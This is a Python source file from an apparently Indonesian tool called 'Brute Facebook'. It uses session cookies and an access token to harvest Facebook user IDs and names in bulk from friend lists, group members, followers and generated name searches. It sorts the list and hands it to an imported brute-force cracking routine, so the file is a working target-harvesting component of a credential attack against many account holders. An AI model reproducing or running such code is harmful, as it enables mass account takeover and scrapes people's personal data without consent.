#######################################################
# Name           : Brute Facebook (BF)                #
# File           : dump.py                            #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 0.4                                #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

import requests, re, sys, random, time

from bs4 import BeautifulSoup as par
from .apcb import Brute_crack
from concurrent.futures import ThreadPoolExecutor as Modol

from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel

merah  = '[#FF0022]'
hapus  = '[/]'
biru_m = '[bold cyan]'
hijau  = '[#00FF33]'
kuning = '[#FFFF00]'

O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
M = '\x1b[1;91m' # MERAH

class Dump:

    def __init__(self, xx, xz):
        self.id1, self.id2 = [], []
        self.cok, self.tok = xx, xz
        self.ses = requests.Session()
        self.url = "https://mbasic.facebook.com"

    def convert(self, url):
        if "https" in url or "facebook" in url:user = url.split("/")[3]
        else: user = url
        try: uid = re.findall(";rid=(\d+)&amp;",str(self.ses.get("https://m.facebook.com/"+user).text))[0]
        except: uid = url
        return uid

    def dump_grup(self):
        prints(Panel(f"[{merah}×{hapus}] member grup di haruskan publik bukan privat!", padding=(0,5), style="bold white", width=70))
        id = input(f"[{O}*{N}] masukkan id grup : ")
        try:
            link = self.ses.get(f"{self.url}/groups/{id}", cookies=self.cok).text
            if "Halaman yang Anda minta tidak ditemukan." in link:
                prints(Panel(f"[{merah}!{hapus}] pengguna dengan grup id {id} tidak ditemukan.", style="bold white", width=70));time.sleep(5);self.dump_grup()
            elif "Anda Diblokir Sementara" in link:
                prints(Panel(f"[{merah}!{hapus}] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun", style="bold white", width=70));time.sleep(5);self.dump_grup()
            elif "Konten Tidak Ditemukan" in link:
                prints(Panel(f"[{merah}!{hapus}] pengguna dengan grup id {id} tidak ditemukan.", style="bold white", width=70));time.sleep(5);self.dump_grup()
            else:
                prints(Panel(f"[{merah}!{hapus}] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.", style="bold white", width=70))
                self.dumps(f"{self.url}/groups/{id}")
        except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
            print("");prints(Panel("😔[bold red] Tidak ada koneksi", style="bold white", width=70));exit()
        prints()
        self.pilihan_id()

    def dumps(self, url):
        try:
            data = self.ses.get(url, cookies=self.cok).text
            cari = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>', data)
            for x in cari:
                if "profile.php?" in x[0]:
                    self.id1.append(re.findall("id=(.*?)&amp;eav", x[0])[0]+"<=>"+x[1])
                else:
                    self.id1.append(re.findall("(.*?)\?eav", x[0])[0]+"<=>"+x[1])
                titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
                for x in titik:
                    sys.stdout.write(f"\r[{M}*{N}] sedang mengumpulkan {H}{len(self.id1)}{N} id{x}{N}");sys.stdout.flush()
            if "Lihat Postingan Lainnya" in data:
                self.dumps(self.url+par(data, "html.parser").find("a", string="Lihat Postingan Lainnya").get("href"))
        except:pass

    def dump_free(self):
        try:
            prints(Panel(f"""[{merah}+{hapus}] user trial cuma bisa mengambil [bold red]1000[/] id...
[{biru_m}*{hapus}] Ketik 'me' jika ingin crack dari daftar teman anda.""", padding=(0,5), style="bold white", width=70))
            try:user = input(f'[{O}?{N}] masukan id atau username : ');uid = self.convert(user)
            except (KeyError, IndexError):exit(f"{N}[{M}×{N}] username atau id tidak benar")
            tol = self.ses.get(f"https://graph.facebook.com/{uid}?fields=friends.fields(id,name).limit(1000)&access_token={self.tok}",cookies=self.cok).json()
            for x in tol["friends"]["data"]:
                self.id1.append(x["id"]+"<=>"+x["name"])
                titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
                for x in titik:
                    sys.stdout.write(f"\r[{M}*{N}] sedang mengumpulkan {H}{len(self.id1)}{N} id{x}{N}");sys.stdout.flush()
        except KeyError:
            exit(f"{N}[{M}×{N}] gagal mengambil id, kemungkinan id tidaklah publik")
        prints()
        self.pilihan_id()

    def dump_prem(self):
        try:
            prints(Panel(f"[{biru_m}*{hapus}] Ketik 'me' jika ingin crack dari daftar teman anda.", padding=(0,5), style="bold white", width=70))
            try:user = input(f'[{O}?{N}] masukan id atau username : ');uid = self.convert(user)
            except (KeyError, IndexError):exit(f"{N}[{M}×{N}] username atau id tidak benar")
            tol = self.ses.get(f"https://graph.facebook.com/{uid}?fields=friends.fields(id,name).limit(5000)&access_token={self.tok}",cookies=self.cok).json()
            for x in tol["friends"]["data"]:
                self.id1.append(x["id"]+"<=>"+x["name"])
                titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
                for x in titik:
                    sys.stdout.write(f"\r[{M}*{N}] sedang mengumpulkan {H}{len(self.id1)}{N} id{x}{N}");sys.stdout.flush()
        except KeyError:
            exit(f"{N}[{M}×{N}] gagal mengambil id, kemungkinan id tidaklah publik")
        prints()
        self.pilihan_id()

    def followers(self):
        try:
            prints(Panel(f"[{biru_m}*{hapus}] Ketik 'me' jika ingin crack dari followers anda.", style="bold white", width=70))
            try:user = input(f'[{O}?{N}] masukan id atau username : ');uid = self.convert(user)
            except (KeyError, IndexError):exit(f"{N}[{M}×{N}] username atau id tidak benar")
            tol = self.ses.get(f"https://graph.facebook.com/{uid}?fields=name,subscribers.fields(id,name).limit(1000000000)&access_token={self.tok}",cookies=self.cok).json()
            for x in tol["subscribers"]["data"]:
                self.id1.append(x["id"]+"<=>"+x["name"])
                titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
                for x in titik:
                    sys.stdout.write(f"\r[{M}*{N}] sedang mengumpulkan {H}{len(self.id1)}{N} id{x}{N}");sys.stdout.flush()
        except:pass
        if "0" in str(len(self.id1)):
            exit(f"{N}[{M}×{N}] gagal mengambil id pengikut, kemungkinan pengikutnya di privat")
        else:
            prints()
            self.pilihan_id()

    def pencarian(self):
        prints(Panel(f' gunakan "[bold yellow],[/]" ([bold yellow]koma[/]) untuk pemisah nama. Contoh: [green]yayan,hamzah,erik', padding=(0,1), style="bold white", width=70))
        nama = []
        custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]
        custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]
        nam = input(f"[{O}*{N}] nama : ").split(",")
        for ser in nam:
            for belakang in custom:
                id = ser+belakang
                nama.append(id)
            for depan in custom2:
                id = depan+ser
                nama.append(id)
        with Modol(max_workers=35) as bool:
            for id in nama:
                bool.submit(self.cari,f"{self.url}/public/{id}?/locale2=id_ID")
        prints()
        self.pilihan_id()

    def cari(self, link):
        gett = par(self.ses.get(str(link)).text, "html.parser")
        for x in gett.find_all('td'):
            data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
            for uid,nama in data:
                if 'profile.php?' in uid:
                    uid = re.findall('id=(.*)',str(uid))[0]
                elif '<span' in nama:
                    nama = re.findall('(.*?)\<',str(nama))[0]
                bo = uid+'<=>'+nama
                if bo in self.id1:pass
                else:self.id1.append(bo)
        try:
            link = gett.find('a',string='Lihat Hasil Selanjutnya').get('href')
            if(link):
                titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
                for x in titik:
                    sys.stdout.write(f"\r[{M}*{N}] sedang mengumpulkan {H}{len(self.id1)}{N} id{x}{N}");sys.stdout.flush()
                self.cari(link)
        except:pass

    def rendem(self):
        prints(Panel(f"[{merah}!{hapus}] masukan jumblah target yang anda inginkan", padding=(0,5), style="bold white", width=70))
        try:
            nanya_keun = int(input(f"[{O}?{N}] jumblah target : "))
        except:nanya_keun=1
        prints(Panel(f"[{biru_m}*{hapus}] Ketik 'me' jika ingin crack dari daftar teman anda.", padding=(0,5), style="bold white", width=70))
        for mnh in range(nanya_keun):
            mnh +=1
            try:user = input(f"[{O}*{N}] masukan id atau username {H}{mnh}{N} : "); uid = self.convert(user)
            except (KeyError, IndexError):print(f"{N}[{M}×{N}] username atau id tidak benar");continue
            try:
                tol = self.ses.get(f"https://graph.facebook.com/{uid}?fields=friends.fields(id,name)&access_token={self.tok}",cookies=self.cok).json()
                for x in tol["friends"]["data"]:
                    self.id1.append(x["id"]+"<=>"+x["name"])
            except KeyError:
                print(f"{N}[{M}×{N}] gagal mengambil id, kemungkinan id tidaklah publik");continue
        self.pilihan_id()

    def pilihan_id(self):
        wow, asw = [], Console()
        prints(Panel(f"         success mengunmpulkan [bold green]{len(self.id1)}[/] id", padding=(0,5), style="bold white", width=70))
        wow.append(Panel.fit(f"[{biru_m}1[/]] akun tertua", padding=(0,2), style="bold white"))
        wow.append(Panel.fit(f"[{biru_m}2[/]] akun termuda", padding=(0,3), style="bold white"))
        wow.append(Panel.fit(f"[{biru_m}3[/]] random akun", padding=(0,3), style="bold white"))
        asw.print(Columns(wow))
        zx = input(f"[{M}?{N}] pilih: ")
        if zx in["1", "01"]:
            for ih in self.id1:
                self.id2.append(ih)
        elif zx in["2", "02"]:
            for ih in self.id1:
                self.id2.insert(0, ih)
        elif zx in["3", "03"]:
            for ih in self.id1:
                wq = random.randint(0, len(self.id2))
                self.id2.insert(wq, ih)
        else:
            print("");prints(Panel(f"😡 input yang bener", style="bold white", width=70));self.pilihan_id()
        Brute_crack(self.id2)